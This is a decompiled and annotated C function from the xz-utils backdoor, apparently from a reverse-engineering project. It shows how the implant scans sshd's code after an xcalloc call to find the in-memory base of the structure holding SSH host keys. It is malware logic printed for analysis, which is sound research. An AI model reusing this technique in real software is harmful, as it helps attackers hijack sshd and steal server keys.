// /home/kali/xzre-ghidra/xzregh/103680_sshd_find_sensitive_data_base_via_xcalloc.c
// Function: sshd_find_sensitive_data_base_via_xcalloc @ 0x103680
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_sensitive_data_base_via_xcalloc(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, string_references_t * string_refs, sensitive_data * * sensitive_data_out)


/*
 * AutoDoc: Consults the cached string references to find sshd's zero-initialisation `xcalloc` call, watches the next handful of instructions for `.bss` stores of the return value, and records up to sixteen unique destinations. Whenever it sees three pointers separated by eight bytes (ptr/ptr+8/ptr+0x10) it treats the lowest slot as the `sensitive_data` base.
 */

#include "xzre_types.h"

BOOL sshd_find_sensitive_data_base_via_xcalloc
               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,
               string_references_t *string_refs,sensitive_data **sensitive_data_out)

{
  u8 *xcalloc_call_target;
  u8 rex_extension;
  BOOL decode_ok;
  long clear_idx;
  long hit_scan_idx;
  long hit_compare_idx;
  u8 **hit_cursor;
  dasm_ctx_t *zero_ctx_cursor;
  u8 *store_operand_ptr;
  ulong hit_index;
  u8 hit_count;
  u8 tracked_reg;
  dasm_ctx_t store_probe_ctx;
  u8 *store_hits[16];
  
  *sensitive_data_out = (sensitive_data *)0x0;
  // AutoDoc: Use the precomputed string catalogue to seed the scan with the `xcalloc` call site.
  xcalloc_call_target = (u8 *)(string_refs->xcalloc_zero_size).func_start;
  if (xcalloc_call_target == (u8 *)0x0) {
    return FALSE;
  }
  tracked_reg = 0xff;
  store_operand_ptr = (u8 *)0x0;
  hit_count = 0;
  // AutoDoc: Zero the recorded store list before watching for `.bss` writes so only fresh candidates feed the ptr/ptr+8/ptr+0x10 heuristic.
  hit_cursor = store_hits;
  for (clear_idx = 0x20; clear_idx != 0; clear_idx = clear_idx + -1) {
    *(u32 *)hit_cursor = 0;
    hit_cursor = (u8 **)((u8 *)hit_cursor + 4);
  }
  // AutoDoc: Wipe the MOV/LEA decoder context prior to every post-call scan so register tracking stays reliable.
  zero_ctx_cursor = &store_probe_ctx;
  for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
    *(u32 *)&zero_ctx_cursor->instruction = 0;
    zero_ctx_cursor = (dasm_ctx_t *)((u8 *)zero_ctx_cursor + 4);
  }
LAB_001036eb:
  do {
    if ((code_end <= code_start) ||
       // AutoDoc: Hunt for the direct CALL into `xcalloc`; each hit restarts the post-call analysis window.
       (decode_ok = find_rel32_call_instruction(code_start,code_end,xcalloc_call_target,&store_probe_ctx),
       decode_ok == FALSE)) goto LAB_00103802;
    code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
    // AutoDoc: Immediately scan the following bytes for a MOV [mem],reg instruction that stores the allocated pointer.
    decode_ok = find_riprel_opcode_memref_ex
                      (code_start,code_start + 0x20,&store_probe_ctx,X86_OPCODE_1B_MOV_STORE,(void *)0x0);
  } while (decode_ok == FALSE);
  if ((store_probe_ctx.prefix.flags_u16 & 0x1040) == 0) {
LAB_00103788:
    if (tracked_reg != 0) {
      code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
      goto LAB_001036eb;
    }
  }
  else {
    if ((store_probe_ctx.prefix.flags_u16 & 0x40) != 0) {
      tracked_reg = store_probe_ctx.prefix.modrm_bytes.modrm_reg;
      if ((store_probe_ctx.prefix.flags_u16 & 0x20) != 0) {
        rex_extension = (store_probe_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1;
LAB_00103782:
        tracked_reg = tracked_reg | rex_extension & 8;
      }
      goto LAB_00103788;
    }
    if ((store_probe_ctx.prefix.flags_u16 & 0x1000) != 0) {
      tracked_reg = store_probe_ctx.mov_imm_reg_index;
      if ((store_probe_ctx.prefix.flags_u16 & 0x20) != 0) {
        rex_extension = (store_probe_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3;
        goto LAB_00103782;
      }
      goto LAB_00103788;
    }
  }
  if (((store_probe_ctx.prefix.flags_u16 & 0x100) != 0) &&
     (store_operand_ptr = (u8 *)store_probe_ctx.mem_disp,
     ((uint)store_probe_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32)) {
    // AutoDoc: Convert the RIP-relative store into an absolute `.bss` pointer before recording it.
    store_operand_ptr = (u8 *)(store_probe_ctx.mem_disp + (long)store_probe_ctx.instruction) + store_probe_ctx.instruction_size;
  }
  if ((data_start <= store_operand_ptr) && (store_operand_ptr < data_end)) {
    hit_index = (ulong)hit_count;
    hit_count = hit_count + 1;
    store_hits[hit_index] = store_operand_ptr;
    if (0xf < hit_count) {
LAB_00103802:
      clear_idx = 0;
      do {
        if ((uint)hit_count <= (uint)clear_idx) {
          return FALSE;
        }
        hit_scan_idx = 0;
        do {
          hit_compare_idx = 0;
          do {
            // AutoDoc: Look for three slots spaced eight bytes apart; that stride matches the struct layout (base, base+8, base+0x10).
            if (((sensitive_data *)store_hits[clear_idx] == (sensitive_data *)(store_hits[hit_scan_idx] + -8)) &&
               (store_hits[hit_scan_idx] == store_hits[hit_compare_idx] + -8)) {
              *sensitive_data_out = (sensitive_data *)store_hits[clear_idx];
              return TRUE;
            }
            hit_compare_idx = hit_compare_idx + 1;
          } while ((uint)hit_compare_idx < (uint)hit_count);
          hit_scan_idx = hit_scan_idx + 1;
        } while ((uint)hit_scan_idx < (uint)hit_count);
        clear_idx = clear_idx + 1;
      } while( TRUE );
    }
  }
  tracked_reg = 0;
  code_start = store_probe_ctx.instruction + store_probe_ctx.instruction_size;
  goto LAB_001036eb;
}

